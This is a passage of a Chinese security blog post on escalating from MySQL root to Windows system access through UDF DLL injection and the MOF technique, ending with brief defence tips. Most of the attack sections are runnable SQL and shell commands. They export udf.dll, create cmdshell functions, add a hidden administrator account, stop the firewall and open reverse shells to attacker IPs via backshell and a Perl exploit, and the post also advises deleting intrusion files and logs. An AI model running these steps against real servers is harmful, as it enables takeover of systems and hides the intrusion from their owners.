+<p>lib_mysqludf_log：用于将调试信息写入日志文件的UDF库。</p>
+<p>lib_mysqludf_preg：直接在MySQL中使用PCRE正则表达式</p>
+<p>lib_mysqludf_stat：用于统计分析的UDF库。</p>
+<p>lib_mysqludf_str：一个带有MySQL附加字符串函数的UDF库</p>
+<p>lib_mysqludf_sys：具有与操作系统交互的功能的UDF库。这些函数允许您与MySQL运行的执行环境进行交互。</p>
+<p>lib_mysqludf_xml：一个UDF库，用于直接从MySQL创建XML输出。</p>
+</blockquote>
+<p>有三种方法向MySQL添加新函数。</p>
+<p>(1)可以通过用户定义的函数(UDF)接口添加函数。用户定义的函数被编译为库文件，然后使用CREATE FUNCTION和DROP FUNCTION语句动态添加到服务器或从服务器中删除。</p>
+<p>(2)可以将函数添加为本机(内置)MySQL函数。本机函数被编译到 mysqld服务器并永久可用。</p>
+<p>(3)添加函数的另一种方法是创建存储的函数。这些是使用SQL语句编写的，而不是通过编译目标代码。</p>
+<h2 id="二、Windows下UDF提权的条件和方法"><a href="#二、Windows下UDF提权的条件和方法" class="headerlink" title="二、Windows下UDF提权的条件和方法"></a><strong>二、Windows下UDF提权的条件和方法</strong></h2><p>Windows下UDF提权对于Windows2008以下服务器比较适用，也即针对Windows2000、Windows2003的成功率较高。</p>
+<p>udf = &#39;user defined function&#39;，即‘用户自定义函数’。是通过添加新函数，对MYSQL的功能进行扩充，性质就象使用本地MYSQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于‘mysql/lib/plugin’目录下，文件后缀为‘.dll’，常用c语言编写。</p>
+<h3 id="1-UDF提权条件"><a href="#1-UDF提权条件" class="headerlink" title="1. UDF提权条件"></a><strong>1. UDF提权条件</strong></h3><p>(1)Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
+<p>(2)Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p>
+<p>(3)掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。</p>
+<p>(4)可以将udf.dll写入到相应目录的权限。</p>
+<h3 id="2-提权方法"><a href="#2-提权方法" class="headerlink" title="2.提权方法"></a><strong>2.提权方法</strong></h3><p><strong>(1)获取数据库版本、数据位置以及插件位置等信息</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">select</span> <span class="keyword">version</span>();//获取数据库版本</span><br><span class="line">2. <span class="keyword">select</span> <span class="keyword">user</span>();//获取数据库用户</span><br><span class="line">3. <span class="keyword">select</span> @@basedir ;//获取安装目录</span><br><span class="line">4. <span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%plugins%'</span>; //寻找mysql安装路径</span><br></pre></td></tr></table></figure>
+
+<p><strong>(2)导出路径</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. C:\Winnt\udf.dll Windows 2000</span><br><span class="line">2. C:\Windows\udf.dll Windows2003(有的系统被转义，需要改为C:Windowsudf.dll)</span><br></pre></td></tr></table></figure>
+
+<p>MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib/plugin文件夹下才能创建自定义函数。该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p>
+<p>在某些情况下，我们会遇到<strong>Can&#39;t open shared library</strong>的情况，这时就需要我们把udf.dll导出到<code>F:\Website\phpstudy\PHPTutorial\MySQL\lib\plugin</code>目录下才可以，网上大牛发现利用NTFS ADS流来创建文件夹的方法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@basedir; //查找到mysql的目录</span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'</span>; //利用NTFS ADS创建lib目录</span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'</span>;//利用NTFS ADS创建plugin目录</span><br><span class="line"></span><br><span class="line">执行成功以后就会plugin目录，然后再进行导出udf.dll即可。</span><br></pre></td></tr></table></figure>
+
+<p><strong>(3)创建cmdshell 函数，该函数叫什么名字在后续中则使用该函数进行查询：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> cmdshell <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> ‘lib_mysqludf_sys.dll’;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(4)执行命令：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(‘whoami’);</span><br></pre></td></tr></table></figure>
+
+<p>一般情况下不会出现创建不成功哦。</p>
+<p>连不上3389可以先停止windows防火墙和筛选</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">select</span> sys_eval(‘net <span class="keyword">stop</span> policyagent’);</span><br><span class="line">2. <span class="keyword">select</span> sys_eval(‘net <span class="keyword">stop</span> sharedaccess’);</span><br></pre></td></tr></table></figure>
+
+<p>udf.dll下常见函数：</p>
+<blockquote>
+<p>cmdshell 执行cmd;</p>
+<p>downloader 下载者,到网上下载指定文件并保存到指定目录;</p>
+<p>open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</p>
+<p>backshell 反弹Shell;</p>
+<p>ProcessView 枚举系统进程;</p>
+<p>KillProcess 终止指定进程;</p>
+<p>regread 读注册表;</p>
+<p>regwrite 写注册表;</p>
+<p>shut 关机,注销,重启;</p>
+<p>about 说明与帮助函数;</p>
+</blockquote>
+<p>具体用户示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">select</span> cmdshell(<span class="string">'net user iis_user 123!@#abcABC /add'</span>);</span><br><span class="line">2. <span class="keyword">select</span> cmdshell(<span class="string">'net localgroup administrators iis_user /add'</span>);</span><br><span class="line">3. <span class="keyword">select</span> cmdshell(<span class="string">'regedit /s d:web3389.reg'</span>);</span><br><span class="line">4. <span class="keyword">select</span> cmdshell(<span class="string">'netstat -an'</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyx1v71qtwj20zs0ij0v0.jpg" alt></p>
+<p>被杀，以后需要再去吐司下载吧。</p>
+<p><strong>(5)清除痕迹</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> cmdshell;// 将函数删除</span><br></pre></td></tr></table></figure>
+
+<p>删除udf.dll文件以及其它相关入侵文件及日志。</p>
+<p><strong>(6)常见错误</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. \<span class="comment">#1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span></span><br><span class="line"></span><br><span class="line">2. <span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">"secure_file_priv"</span></span><br><span class="line"></span><br><span class="line">在my.ini 或者mysql.cnf 文件中注销 (使用<span class="comment">#号) 包含secure_file_priv的行。</span></span><br><span class="line"></span><br><span class="line"><span class="number">1123</span> - Can<span class="string">'t initialize function '</span>backshell<span class="string">'; UDFs are unavailable with the --skip-grant-tables option，需要将my.ini中的skip-grant-tables选项去掉。</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.cnblogs.com/litlife/p/9030673.html" target="_blank" rel="noopener">嘻嘻嘻</a></p>
+<h2 id="三、一个提权实例-1"><a href="#三、一个提权实例-1" class="headerlink" title="三、一个提权实例"></a><strong>三、一个提权实例</strong></h2><p><strong>1.设置Mysql提权脚本文件</strong></p>
+<p>将Mysql提权脚本文件上传到服务器上，运行后，需要对IP地址、UID、passwod、db进行配置，如图1所示，IP地址一般可以设置为localhost、127.0.0.1以及真实IP地址，uid默认为root，其它具有root用户权限的用户名称也可以，pwd为具有root权限用户的密码，db默认选择mysql，单击提交查询内容进行连接测试。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyww4tvbdvj20ax064jre.jpg" alt></p>
+<p>设置Mysql提交脚本文件</p>
+<p><strong>2.进行连接测试</strong></p>
+<p>连接成功后，会给出相应的提示信息，如图2所示，给出用户，数据库，数据目录(datadir)，基本目录(basedir)，版本，插件路径，mysql函数等信息。连接测试</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyww6us1qwj20bd08j0t3.jpg" alt></p>
+<p><strong>3.创建“shell”函数</strong></p>
+<p>单击“Dump UDF” 将UDF.DLL文件导出到默认的插件目录下，然后再运行“Create Function”将创建“shell”函数。如图3所示，如果前面已经创建过shell函数，则会提示系统中已经存在“shell”函数 。创建“shell”函数</p>
+<p><a href="http://s1.51cto.com/wyfs02/M02/8E/56/wKiom1i-DCPCf-qnAAAuT4IkzJ8440.jpg" target="_blank" rel="noopener"><img src="http://s1.51cto.com/wyfs02/M02/8E/56/wKiom1i-DCPCf-qnAAAuT4IkzJ8440.jpg" alt="实例解析：MySQL数据库扩展接口UDF提权"></a></p>
+<p><strong>4.查看用户</strong></p>
+<p>在查询窗口中输入“select shell(&#39;cmd&#39;,&#39;net user&#39;)”查看系统所有的用户，如图4所示，可以正常查看系统的所有用户信息。查看用户</p>
+<p><a href="http://s1.51cto.com/wyfs02/M00/8E/54/wKioL1i-DDXzVIzjAAAp237OOX8004.jpg" target="_blank" rel="noopener"><img src="http://s1.51cto.com/wyfs02/M00/8E/54/wKioL1i-DDXzVIzjAAAp237OOX8004.jpg" alt="实例解析：MySQL数据库扩展接口UDF提权"></a></p>
+<p><strong>5.创建具有管理员权限的用户</strong></p>
+<p>分别在查询中输入脚本“select shell(&#39;cmd&#39;,&#39;net user temp temp123456&#39;)”、“select shell(&#39;cmd&#39;,&#39;net localgroup administrators temp /add &#39;)”并执行该查询命令，如果执行成功，则表示在系统中添加“temp”用户，密码为“temp123456”，同时将该用户添加到管理员组中，使其具备管理员权限，执行成功后如图5，图6所示。</p>
+<p><a href="http://s4.51cto.com/wyfs02/M01/8E/56/wKiom1i-DD-joRkMAAAtbI3D9VY491.jpg" target="_blank" rel="noopener"><img src="http://s4.51cto.com/wyfs02/M01/8E/56/wKiom1i-DD-joRkMAAAtbI3D9VY491.jpg" alt="实例解析：MySQL数据库扩展接口UDF提权"></a></p>
+<p>添加temp用户</p>
+<p><a href="http://s3.51cto.com/wyfs02/M02/8E/54/wKioL1i-DE2TsjzPAAAev8_z1zY368.jpg" target="_blank" rel="noopener"><img src="http://s3.51cto.com/wyfs02/M02/8E/54/wKioL1i-DE2TsjzPAAAev8_z1zY368.jpg" alt="实例解析：MySQL数据库扩展接口UDF提权"></a></p>
+<p>将用户temp添加到管理员组</p>
+<p><strong>6.提权成功</strong></p>
+<p>在SQL查询中输入“select shell(&#39;cmd&#39;,&#39;net localgroup administrators&#39;)”命令查看刚才添加到用户是否真的添加成功，如图7所示，查询结果表明已经将temp用户添加到管理员组中。</p>
+<p><a href="http://s4.51cto.com/wyfs02/M00/8E/56/wKiom1i-DGuRHHXzAABCTVxr46M615.jpg" target="_blank" rel="noopener"><img src="http://s4.51cto.com/wyfs02/M00/8E/56/wKiom1i-DGuRHHXzAABCTVxr46M615.jpg" alt="实例解析：MySQL数据库扩展接口UDF提权"></a></p>
+<p>查看管理员用户</p>
+<p>目前对于一些网站来说，一般都会提供远程终端服务，只要用户添加成功，则可以直接登录该服务器，如图8所示，输入用户名和密码，成功进入该服务器，至此通过mysql的root用户成功提权。</p>
+<p>图8成功进入服务器</p>
+<h2 id="四、其它提权工具"><a href="#四、其它提权工具" class="headerlink" title="四、其它提权工具"></a><strong>四、其它提权工具</strong></h2><p>v5est0r 写了一个Mysql提权综合利用工具，详细情况请参考其代码共享网站：<a href="https://github.com/v5est0r/Python_FuckMySQL其主要功能有：" target="_blank" rel="noopener">https://github.com/v5est0r/Python_FuckMySQL其主要功能有：</a></p>
+<p>1.自动导出你的backdoor和mof文件</p>
+<p>2.自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权</p>
+<p>3.导出LPK.dll文件，劫持系统目录提权</p>
+<p>4.写启动项提权</p>
+<p>UdF自动提权：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p root -e <span class="string">"ver&amp;whoami"</span> -m udf</span><br></pre></td></tr></table></figure>
+
+<p>LPK劫持提权：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p root -e <span class="string">"ver&amp;whoami"</span> -m lpk</span><br></pre></td></tr></table></figure>
+
+<p>启动项提权：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p root -e <span class="string">"ver&amp;whoami"</span> –m st</span><br></pre></td></tr></table></figure>
+
+<p>例如通过LOAD_FILE来查看Mysql配置文件my.ini，如果其中配置了skip-grant-tables，这无法进行提权，如图9所示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD_FILE(&apos;C:/Users/Administrator/Desktop/mysql-5.6.24-win32/my.ini&apos;);</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://s2.51cto.com/wyfs02/M01/8E/54/wKioL1i-DH-hlvDEAABwzfevMTw562.jpg" target="_blank" rel="noopener"><img src="http://s2.51cto.com/wyfs02/M01/8E/54/wKioL1i-DH-hlvDEAABwzfevMTw562.jpg" alt="实例解析：MySQL数据库扩展接口UDF提权"></a></p>
+<p>查看mysql数据库配置文件内容</p>
+<h2 id="五、UDF提权总结与防范"><a href="#五、UDF提权总结与防范" class="headerlink" title="五、UDF提权总结与防范"></a><strong>五、UDF提权总结与防范</strong></h2><p>目前安装的Mysql数据库版本基本是高于5.1版本，通过Mysql查询可以导出udf.dll但由于mysql中my.ini文件的配置，有可能会导致无法创建自定义函数。这时候就需要修改my.ini进行重启。</p>
+<p><strong>1.提权总结</strong></p>
+<p>(1)有webshell的提权</p>
+<p>如果获取了webshell则比较简单，目前有很多Mysql提权的PHP脚本，可以比较快速的进行提权，在此不赘述。</p>
+<p>(2)无webshell的提权</p>
+<blockquote>
+<p>select version(); //获取mysql版本</p>
+<p>select @@basedir; //查找到mysql的目录</p>
+<p>SHOW VARIABLES LIKE &#39;%plugin%&#39; //查看高版本插件位置</p>
+</blockquote>
+<p>通过查询将udf.dll转成代码插入数据库，然后导出</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> mysql;</span><br><span class="line"><span class="keyword">set</span> @a=<span class="keyword">concat</span>(<span class="string">''</span>,<span class="number">0</span>x代码);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Ghost(<span class="keyword">data</span> LONGBLOB);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Ghost <span class="keyword">values</span>(<span class="string">""</span>);<span class="keyword">update</span> Ghost <span class="keyword">set</span> <span class="keyword">data</span> = @a;</span><br><span class="line">代码为<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">'c:/udf.dll'</span>))中的内容</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> Ghost <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/phpStudy/MySQL/lib/plugin/udf.dll'</span>; //导出ufd.dll</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> backshell <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'udf.dll'</span>;//创建函数</span><br><span class="line"><span class="keyword">select</span> backshell(<span class="string">"192.168.40.135"</span>,<span class="number">4444</span>);</span><br></pre></td></tr></table></figure>
+
+<p>(3)使用Python_FuckMySQL工具进行自动提权</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p root -e <span class="string">"ver&amp;whoami"</span> -m udf</span><br><span class="line">python root.py -a <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p root -e <span class="string">"ver&amp;whoami"</span> -m lpk</span><br><span class="line">python root.py -a <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p root -e <span class="string">"ver&amp;whoami"</span> –m st</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.安全防范方法</strong></p>
+<p>(1)尽量避免提供对外链接，通过mysql中的user表进行查看，禁用“%”。</p>
+<p>(2)设置复杂的Root账号密码。</p>
+<p>(3)对my.ini设置只读属性，设置plugin目录为只读目录。</p>
+<h2 id="0x04-MySQL数据库Root权限MOF方法提权研究"><a href="#0x04-MySQL数据库Root权限MOF方法提权研究" class="headerlink" title="0x04 MySQL数据库Root权限MOF方法提权研究"></a>0x04 MySQL数据库Root权限MOF方法提权研究</h2><p>MySQL Root权限MOF方法提权是来自国外Kingcope大牛发布的MySQL Scanner &amp; MySQL Server for Windows Remote SYSTEM Level Exploit(<a href="https://www.exploit-db.com/exploits/23083/)，简称mysql远程提权0day" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/23083/)，简称mysql远程提权0day</a>(MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day)。Windows 管理规范 (WMI) 提供了以下三种方法编译到 WMI 存储库的托管对象格式 (MOF) 文件：</p>
+<blockquote>
+<p>方法1：运行 MOF 文件指定为命令行参数将 Mofcomp.exe 文件。</p>
+<p>方法2：使用 IMofCompiler 接口和 $ CompileFile 方法。</p>
+<p>方法3：拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹的 MOF 文件。</p>
+</blockquote>
+<p>Microsoft 建议您到存储库编译 MOF 文件使用前两种方法。也就是运行 Mofcomp.exe 文件，或使用 IMofCompiler::CompileFile 方法。第三种方法仅为向后兼容性与早期版本的 WMI 提供，并因为此功能可能不会提供在将来的版本后，不应使用。注意使用MOF方法提权的前提是当前Root帐号可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下，否则会失败!</p>
+<h2 id="一、漏洞利用方法分析"><a href="#一、漏洞利用方法分析" class="headerlink" title="一、漏洞利用方法分析"></a><strong>一、漏洞利用方法分析</strong></h2><p>该漏洞的利用前提条件是必须具备mysql的root权限，在Kingcope公布的0day中公布了一个pl利用脚本。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl mysql_win_remote.pl <span class="number">192.168</span>.<span class="number">2.100</span> root <span class="string">""</span> <span class="number">192.168</span>.<span class="number">2.150</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure>
+
+<p>192.168.2.100为mysql数据库所在服务器，mysql口令为空，反弹到192.168.2.150的5555端口上。</p>
+<p>1.生成nullevt.mof文件</p>
+<p>将以下代码保存为nullevt.mof文件：</p>
+<p>2.通过Mysql查询将文件导入</p>
+<p>执行以下查询语句，将上面生成的nullevt.mof导入到c:\windows\system32\wbem\mof\目录下在windows7中默认是拒绝访问的。导入后系统会自动运行，执行命令。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'C:\\RECYCLER\\nullevt.mof'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/windows/system32/wbem/mof/nullevt.mof'</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、实战利用"><a href="#二、实战利用" class="headerlink" title="二、实战利用"></a><strong>二、实战利用</strong></h2><p><strong>1.实验环境</strong></p>
+<p>本次实验环境为Windows2003+Apache+PHP，已经拥有Webshell权限。</p>
+<p><strong>2.上传文件到可写目录</strong></p>
+<p>将nullevt.mof文件上传到服务器可写目录，例如C:\RECYCLER\，如图5-4所示。</p>
+<p><a href="http://s1.51cto.com/wyfs02/M01/89/9A/wKiom1gX-qqjXew4AACKSax21YE067.jpg-wh_651x-s_69971220.jpg" target="_blank" rel="noopener"><img src="http://s1.51cto.com/wyfs02/M01/89/9A/wKiom1gX-qqjXew4AACKSax21YE067.jpg-wh_651x-s_69971220.jpg" alt="技术干货：MySQL数据库Root权限MOF方法提权研究"></a></p>
+<p>上传文件nullevt.mof</p>
+<p><strong>3.执行命令</strong></p>
+<p>配置好中国菜刀，然后通过数据库管理，执行查询命令，在执行查询命令前需要先选择一下数据库，然后将以下代码复制到查询语句输入框中，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'C:\\RECYCLER\\nullevt.mof'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/windows/system32/wbem/mof/nullevt.mof'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>执行查询命令</p>
+<p><strong>4.查看执行结果</strong></p>
+<p>执行完毕后需要修改添加用户命令为将用户添加到管理员组，即<code>“net.exe localgroup administrators admin/add\”</code>，再次上传并查询，通过net user查看，果然admin已被添加到系统中。</p>
+<p>添加用户成功</p>
+<h2 id="三、防范方法"><a href="#三、防范方法" class="headerlink" title="三、防范方法"></a><strong>三、防范方法</strong></h2><p>Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p>
+<p>1.在程序数据库连接文件中尽量不要使用Root帐号进行连接。</p>
+<p>2.Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</p>
+<p>3.对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</p>
+<p>4.操作系统目录c:\windows\system32\wbem禁止写入。</p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql提权/" title="mysql提权篇">https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql提权/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/mysql/" rel="tag"><i class="fa fa-tag"></i># mysql</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/05/2019-1-4-使用Meterpreter的多种姿势/" rel="next" title="使用Meterpreter的多种姿势">
+                <i class="fa fa-chevron-left"></i> 使用Meterpreter的多种姿势
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/07/2019-1-7-BypassWaf_sql/" rel="prev" title="BypassWaf_sql">
+                BypassWaf_sql <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
